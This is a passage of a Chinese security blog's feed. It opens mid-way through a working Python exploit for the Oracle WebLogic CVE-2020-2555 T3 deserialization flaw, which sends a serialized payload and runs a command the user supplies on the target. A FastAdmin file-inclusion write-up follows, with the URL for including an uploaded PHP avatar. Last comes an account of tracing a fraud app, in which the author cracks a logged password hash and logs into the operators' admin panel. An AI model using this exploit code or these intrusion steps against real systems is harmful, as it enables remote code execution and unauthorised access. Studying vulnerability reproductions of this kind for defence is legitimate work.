payload&#x3D;&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">        payload+&#x3D;data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">        payload+&#x3D;&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line">        payload &#x3D; &#39;%s%s&#39;%(&#39;&#123;:08x&#125;&#39;.format(len(payload)&#x2F;2 + 4),payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">        sock.send(payload.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">        time.sleep(2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">        sock.send(payload.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">        res &#x3D; &#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">        n&#x3D;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">        try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">            while True:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">                n +&#x3D; 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">                res +&#x3D; sock.recv(4096)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">                time.sleep(0.1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line">                if(n&gt;15):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">                    break</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line">        except Exception as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line">            pass</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line">        return res</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">    def check(self, url, cmd,timeout, proxies&#x3D;globalProxies, **args):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line">        (proto, ip, port, uri) &#x3D; parseUrl(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">91</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">92</span></pre></td><td class="code"><pre><span class="line">        server_addr &#x3D; (ip, int(port))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">93</span></pre></td><td class="code"><pre><span class="line">        if proto &#x3D;&#x3D; &#39;https&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">94</span></pre></td><td class="code"><pre><span class="line">            sock &#x3D; ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">95</span></pre></td><td class="code"><pre><span class="line">        else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">96</span></pre></td><td class="code"><pre><span class="line">            sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">97</span></pre></td><td class="code"><pre><span class="line">        sock.settimeout(timeout)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">98</span></pre></td><td class="code"><pre><span class="line">        try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">99</span></pre></td><td class="code"><pre><span class="line">            self.t3handshake(sock,server_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">100</span></pre></td><td class="code"><pre><span class="line">            self.buildT3RequestObject(sock,port)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">101</span></pre></td><td class="code"><pre><span class="line">            payload &#x3D; CVE_2020_2555(cmd)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">102</span></pre></td><td class="code"><pre><span class="line">            resp &#x3D; self.sendEvilObjData(sock,payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">103</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">104</span></pre></td><td class="code"><pre><span class="line">            print (&#39;[+] Payload send succeed! Please check.&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">105</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">106</span></pre></td><td class="code"><pre><span class="line">            return True</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">107</span></pre></td><td class="code"><pre><span class="line">        except Exception as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">108</span></pre></td><td class="code"><pre><span class="line">            print (&#39;[-] Failed! Exception:&#123;&#125;&#39;.format(str(e)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">109</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">110</span></pre></td><td class="code"><pre><span class="line">        return False</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">111</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">112</span></pre></td><td class="code"><pre><span class="line">def poc(url,cmd):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">113</span></pre></td><td class="code"><pre><span class="line">    x &#x3D; payloadtest()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">114</span></pre></td><td class="code"><pre><span class="line">    return x.check(url, cmd,20)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">115</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">116</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">117</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">118</span></pre></td><td class="code"><pre><span class="line">    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Weblogic cve-2020-2555 Exp&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">119</span></pre></td><td class="code"><pre><span class="line">                                     usage&#x3D;&#39;[*] use &quot;python %(prog)s --help&quot; for more information&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">120</span></pre></td><td class="code"><pre><span class="line">                                     formatter_class&#x3D;argparse.RawTextHelpFormatter)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">121</span></pre></td><td class="code"><pre><span class="line">    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">122</span></pre></td><td class="code"><pre><span class="line">                        dest&#x3D;&quot;url&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">123</span></pre></td><td class="code"><pre><span class="line">                        help&#x3D;&quot;the url to check&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">124</span></pre></td><td class="code"><pre><span class="line">                        )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">125</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">126</span></pre></td><td class="code"><pre><span class="line">    parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">127</span></pre></td><td class="code"><pre><span class="line">                        dest&#x3D;&quot;cmd&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">128</span></pre></td><td class="code"><pre><span class="line">                        help&#x3D;&quot;the cmd to run on the target&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">129</span></pre></td><td class="code"><pre><span class="line">                        )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">130</span></pre></td><td class="code"><pre><span class="line">    args &#x3D; parser.parse_args()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">131</span></pre></td><td class="code"><pre><span class="line">    if not args.url or not args.cmd:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">132</span></pre></td><td class="code"><pre><span class="line">        sys.exit(&#39;[*] Please assign url and cmd! \n[*] Examples python cve-2020-2883_cmd.py -u http:&#x2F;&#x2F;127.0.0.1:7001 -c calc&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">133</span></pre></td><td class="code"><pre><span class="line">    poc(args.url, args.cmd)</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      weblogic历史漏洞利用总结与检测
    
    </summary>
    
    
      <category term="漏洞总结" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="漏洞复现" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="weblogic" scheme="http://h3art3ars.github.io/tags/weblogic/"/>
    
      <category term="漏洞检测" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>fastadmin前台漏洞复现</title>
    <link href="http://h3art3ars.github.io/2020/09/23/fastadmin%E5%89%8D%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://h3art3ars.github.io/2020/09/23/fastadmin%E5%89%8D%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-09-23T02:24:50.000Z</published>
    <updated>2020-09-23T02:31:43.138Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FastAdmin前台漏洞getshell分析"><a href="#FastAdmin前台漏洞getshell分析" class="headerlink" title="FastAdmin前台漏洞getshell分析"></a>FastAdmin前台漏洞getshell分析</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><h4 id="V1-0-0-20200506-beta"><a href="#V1-0-0-20200506-beta" class="headerlink" title="V1.0.0.20200506_beta"></a>V1.0.0.20200506_beta</h4><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>根据官网的修复方法</p><p><img src="/images/image-20200921165512720.png" alt="image-20200921165512720"></p><p>可以看到产生漏洞的位置  <code>application/index/controller/User.php</code> 看一下 <code>_empty()</code> 方法，将传入的 <code>$name</code>参数未经过滤，直接传输到 <code>fetch</code>方法中。</p><p>先调用了 view文件内的 <code>fetch</code> 方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function fetch($template &#x3D; &#39;&#39;, $vars &#x3D; [], $replace &#x3D; [], $config &#x3D; [], $renderContent &#x3D; false)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">   &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">       &#x2F;&#x2F; 模板变量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">       $vars &#x3D; array_merge(self::$var, $this-&gt;data, $vars);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">       &#x2F;&#x2F; 页面缓存</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">       ob_start();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">       ob_implicit_flush(0);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">       &#x2F;&#x2F; 渲染输出</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">       try &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">           $method &#x3D; $renderContent ? &#39;display&#39; : &#39;fetch&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">           &#x2F;&#x2F; 允许用户自定义模板的字符串替换</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">           $replace &#x3D; array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">           $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;, $replace);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">           $this-&gt;engine-&gt;$method($template, $vars, $config); &#x2F;&#x2F;$template为传入参数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">       &#125; catch (\Exception $e) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">           ob_end_clean();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">           throw $e;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">       &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">      ...</span></pre></td></tr></table></figure><p>之后调用了 think文件内的 <code>fetch</code>方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function fetch($template, $data &#x3D; [], $config &#x3D; [])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        if (&#39;&#39; &#x3D;&#x3D; pathinfo($template, PATHINFO_EXTENSION)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">            &#x2F;&#x2F; 获取模板文件名</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">            $template &#x3D; $this-&gt;parseTemplate($template);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F; 模板不存在 抛出异常</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        if (!is_file($template)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">            throw new TemplateNotFoundException(&#39;template not exists:&#39; . $template, $template);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F; 记录视图信息</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        App::$debug &amp;&amp; Log::record(&#39;[ VIEW ] &#39; . $template . &#39; [ &#39; . var_export(array_keys($data), true) . &#39; ]&#39;, &#39;info&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;template-&gt;fetch($template, $data, $config);</span></pre></td></tr></table></figure><p>在此处经过 <code>is_file</code> 函数判断 ，再次调用<code>template</code>文件内的 <code>fetch</code>方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function fetch($template, $vars &#x3D; [], $config &#x3D; [])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    if ($vars) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;data &#x3D; $vars;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    if ($config) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;config($config);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    if (!empty($this-&gt;config[&#39;cache_id&#39;]) &amp;&amp; $this-&gt;config[&#39;display_cache&#39;]) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F; 读取渲染缓存</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        $cacheContent &#x3D; Cache::get($this-&gt;config[&#39;cache_id&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        if (false !&#x3D;&#x3D; $cacheContent) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">            echo $cacheContent;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">            return;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    $template &#x3D; $this-&gt;parseTemplateFile($template);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    if ($template) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        $cacheFile &#x3D; $this-&gt;config[&#39;cache_path&#39;] . $this-&gt;config[&#39;cache_prefix&#39;] . md5($this-&gt;config[&#39;layout_name&#39;] . $template) . &#39;.&#39; . ltrim($this-&gt;config[&#39;cache_suffix&#39;], &#39;.&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        if (!$this-&gt;checkCache($cacheFile)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            &#x2F;&#x2F; 缓存无效 重新模板编译</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">            $content &#x3D; file_get_contents($template);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            $this-&gt;compiler($content, $cacheFile);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F; 页面缓存</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">        ob_start();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        ob_implicit_flush(0);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F; 读取编译存储</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;storage-&gt;read($cacheFile, $this-&gt;data); &#x2F;&#x2F;此处为thinkphp&lt;5.0.18 文件包含漏洞发生处</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">        $content &#x3D; ob_get_clean();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">        ......</span></pre></td></tr></table></figure><p>主要意思就是将传入的未经过滤<code>$template</code>文件，经过  <code>$this-&gt;storage-&gt;read</code>包含执行，最终造成文件包含漏洞。</p><p>要访问漏洞的方法，必须是配置文件为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;是否开启前台会员中心</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#39;usercenter&#39;            &#x3D;&gt; true,</span></pre></td></tr></table></figure><p>[90sec][<a href="https://forum.90sec.com/t/topic/1294]" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/1294]</a> 上有人发出windows上面的利用方式。</p><p>先注册用户，之后上传带有php代码的头像，查看头像位置，最后访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;index.php&#x2F;index&#x2F;user&#x2F;_empty?name&#x3D;..&#x2F;uploads&#x2F;xxxxxx.jpg</span></pre></td></tr></table></figure><p>即可包含文件</p><p>如果含有其他的文件可控点，也是可以包含的，比如仍然使用低版本thinkphp的fastadmin的日志。包含的文件必须有后缀名，否则默认为 <code>.html</code></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><h4 id="V1-0-0-20200920-beta已修复，官方删除了-application-index-User-php-内的-empty-方法。"><a href="#V1-0-0-20200920-beta已修复，官方删除了-application-index-User-php-内的-empty-方法。" class="headerlink" title="V1.0.0.20200920_beta已修复，官方删除了 application/index/User.php 内的 _empty() 方法。"></a>V1.0.0.20200920_beta已修复，官方删除了 <code>application/index/User.php</code> 内的 <code>_empty()</code> 方法。</h4>]]></content>
    
    <summary type="html">
    
      fastadmin202005漏洞复现
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>一次黑产溯源</title>
    <link href="http://h3art3ars.github.io/2020/09/06/%E4%B8%80%E6%AC%A1%E9%BB%91%E4%BA%A7%E6%BA%AF%E6%BA%90/"/>
    <id>http://h3art3ars.github.io/2020/09/06/%E4%B8%80%E6%AC%A1%E9%BB%91%E4%BA%A7%E6%BA%AF%E6%BA%90/</id>
    <published>2020-09-06T13:33:29.000Z</published>
    <updated>2022-05-24T14:40:55.169Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次黑产溯源"><a href="#记一次黑产溯源" class="headerlink" title="记一次黑产溯源"></a>记一次黑产溯源</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>一个黑产仿冒客户的app，进行贷款诈骗，然后给我的任务就是尽可能的收集证据。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>客户给了一个app下载链接。</p><p><code>https://dbfgef.app*****.com/</code></p><p>查了一下ip位置，发现是新浪云服务器。</p><p>然后查看了一下下载页面，是一个仿冒应用宝下载页面。</p><p>仔细分析了一下页面，并且爆破了一下目录。</p><p>发现了 <code>/get.php</code>，发现了两个链接。</p><p><img src="/images/image-20200824204053339.png" alt="image-20200824204053339"></p><p>分别为andriod和ios应用。分别存储在其阿里云oss和一个应用分发平台。</p><p><img src="/images/image-20200824204217888.png" alt="image-20200824204217888"></p><p>应用分发脱离了平台，暂时放过。</p><p>分析一下app，下载app，进入app。</p><p><img src="/images/image-20200824204531686.png" alt="image-20200824204531686"></p><p>发现像是webview，抓了一个包，从web端访问，发现可以访问。之后就从web端开始测试了。</p><p>发现有头像上传，尝试文件上传。上传失败。查看url发现其上传的api是由另一台服务器处理的，于时访问此服务器直接发现了一个上传页面。</p><p><img src="/images/image-20200824205053058.png" alt="image-20200824205053058"></p><p>测试了一下，发现其上传后，还是传到阿里云oss，测试了一下，发现上传页面是使用thinkphp框架搭建，但是是5.0.24版本，无法利用。</p><p>继续查看web端，测试报错，发现其使用了thinkphp3.2.3框架开发。尝试访问日志成功。</p><p>在其中发现</p><p><img src="/images/image-20200824205613676.png" alt="image-20200824205613676"></p><p>cmd5解出密码账号密码 <code>1:[空格] [空格] [空格] [空格] [空格] [空格]</code></p><p>但是尝试了日志中的路径，均无法访问后台。猜测应该是前后台分离。</p><p>之后尝试了子域名，域名解析ip，以及同一ip下的域名访问，都没有查到相关信息。</p><p>之后再次尝试网站报错</p><p><img src="/images/image-20200824205838923.png" alt="image-20200824205838923"></p><p>发现其报错目录的域名，和web访问的域名不同。</p><p>尝试访问此域名。</p><p><img src="/images/image-20200824210144929.png" alt="image-20200824210144929"></p><p>是一个ios下载页面，测试了一下，没有什么功能，就提供了一个页面和下载链接。</p><p>之后再次尝试此域名的子域名，相关域名，同ip的域名。多番验证，找到这个页面。</p><p><img src="/images/image-20200824210920283.png" alt="image-20200824210920283"></p><p>直觉告诉我这是他们的后台。尝试上面得到的账号密码登录。成功登录。</p><p><img src="/images/image-20200824210608479.png" alt="image-20200824210608479"></p><p>看了一下信息，发现有之前在app注册的账号，再次证明为目标后台。之后后台尝试拿shell，未成功。</p><p>至此信息收集结束，打包交给客户。</p><p>然后过了一段时间，发现除了前台和后台，其他的站还好好的。</p><p><img src="/images/image-20200824210830301.png" alt="image-20200824210830301"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>渗透测试的本质还是信息收集，收集的范围，和目标相关联的资产越多，测试下来能发现的漏洞就越多。还有就是违法的事情不能做，不然动了别人的利益，哪里都跑不掉。</p>]]></content>
    
    <summary type="html">
    
      溯源记录
    
    </summary>
    
    
      <category term="溯源" scheme="http://h3art3ars.github.io/categories/%E6%BA%AF%E6%BA%90/"/>
    
    
      <category term="信息收集" scheme="http://h3art3ars.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
      <category term="溯源" scheme="http://h3art3ars.github.io/tags/%E6%BA%AF%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试纪实-tp过安全狗</title>
    <link href="http://h3art3ars.github.io/2020/05/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-tp%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97/"/>
    <id>http://h3art3ars.github.io/2020/05/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-tp%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97/</id>
    <published>2020-05-22T13:45:12.000Z</published>
    <updated>2020-05-22T13:47:52.911Z</updated>
    
